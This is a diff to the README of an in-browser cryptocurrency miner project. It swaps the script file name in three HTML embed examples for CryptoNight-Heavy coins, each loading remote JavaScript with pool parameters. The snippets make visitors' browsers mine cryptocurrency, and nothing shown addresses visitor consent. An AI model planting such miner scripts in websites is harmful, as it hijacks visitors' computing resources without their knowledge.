@@ -50,15 +50,15 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | INTUcoin | Lethean (IntenseC
 ```
 #### Examples: CN Heavy Classic Coins (Bixbite) need ?algo=cn-heavy/0<br> 
 ```sh
-<script src="https://daslebenistkeinponyhof.netlify.com/mmh.js?perfekt=wss://?algo=cn-heavy/0?jason=Your_Favorite_Pool:PortNr" > </script>
+<script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-heavy/0?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
 #### Examples: CN Heavy XHV Coins (Haven, Bloc.Money, Saronite) need ?algo=cn-heavy/xhv<br> 
 ```sh
-<script src="https://daslebenistkeinponyhof.netlify.com/mmh.js?perfekt=wss://?algo=cn-heavy/xhv?jason=Your_Favorite_Pool:PortNr" > </script>
+<script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-heavy/xhv?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
 #### Examples: CN-Saber Coins (BitTube) need ?algo=cn-heavy/tube<br> 
 ```sh
-<script src="https://daslebenistkeinponyhof.netlify.com/mmh.js?perfekt=wss://?algo=cn-heavy/tube?jason=Your_Favorite_Pool:PortNr" > </script>
+<script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-heavy/tube?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
 <br><br> 
 Or use our integration for websites & blogs
